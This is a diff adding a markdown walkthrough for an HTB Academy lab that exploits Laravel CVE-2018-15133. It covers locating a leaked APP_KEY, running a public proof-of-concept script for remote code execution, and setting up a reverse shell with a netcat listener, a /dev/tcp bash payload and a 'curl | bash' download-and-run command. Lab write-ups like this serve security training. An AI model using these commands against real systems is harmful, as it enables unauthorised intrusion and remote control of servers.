@@ -1,0 +1,129 @@
+# Laravel CVE-2018-15133 Exploit - HTB Academy Lab Walkthrough
+
+This markdown provides a step-by-step explanation of how to exploit Laravel vulnerability **CVE-2018-15133** in HTB Academy lab.
+
+---
+
+## Lab Target
+
+```
+http://dev-staging-01.academy.htb
+```
+
+---
+
+## 1. Initial Recon and Error Message
+
+Accessing the site may show an error like:
+
+```
+UnexpectedValueException: The stream or file "/var/www/html/.../storage/logs/laravel.log" could not be opened in append mode: Permission denied
+```
+
+This indicates it's a **Laravel** application. You may spot the APP\_KEY in debug output or config leaks.
+
+---
+
+## 2. Where to Find APP\_KEY?
+
+Explore these paths:
+
+* `/api/.env`
+* `/api/debug`
+* `/info`
+* Use tools like `gobuster` or Burp Suite to fuzz directories
+
+Eventually you get:
+
+```
+dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0=
+```
+
+This is your **Laravel APP\_KEY**.
+
+---
+
+## 3. Clone Laravel Exploit
+
+```bash
+git clone https://github.com/aljavier/exploit_laravel_cve-2018-15133
+cd exploit_laravel_cve-2018-15133
+```
+
+---
+
+## 4. Setup Environment
+
+If on Kali (restricted system Python packages):
+
+```bash
+sudo apt install python3-venv
+python3 -m venv laravel_env
+source laravel_env/bin/activate
+```
+
+Then install the required packages:
+
+```bash
+pip install pycryptodome requests
+```
+
+---
+
+## 5. Run the Exploit
+
+```bash
+python3 pwn_laravel.py http://dev-staging-01.academy.htb/ dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0= --interactive
+```
+
+You’ll get a pseudo shell (interactive RCE).
+
+---
+
+## 6. Get Reverse Shell
+
+### On Attacker Machine:
+
+```bash
+nc -lvnp 4444
+```
+
+### Host Payload:
+
+```bash
+echo 'bash -i >& /dev/tcp/10.10.14.3/4444 0>&1' > index.html
+sudo python3 -m http.server 80
+```
+
+### On Victim (inside interactive shell):
+
+```bash
+curl http://10.10.14.3/index.html | bash
+```
+
+Now you’ll get a full reverse shell on your listener.
+
+---
+
+## Notes
+
+* You must find the **APP\_KEY** first.
+* Laravel unserialization attack requires valid key and insecure app version.
+* Exploit works on Laravel <= 5.6.
+
+---
+
+## Disclaimer
+
+This exploit is for educational purposes only. Do not use on unauthorized systems.
+
+---
+
+## Credit
+
+* PoC by [aljavier](https://github.com/aljavier)
+* CVE Reference: [CVE-2018-15133](https://nvd.nist.gov/vuln/detail/CVE-2018-15133)
+
+---
+
+Made for HTB Academy practice walkthroughs.
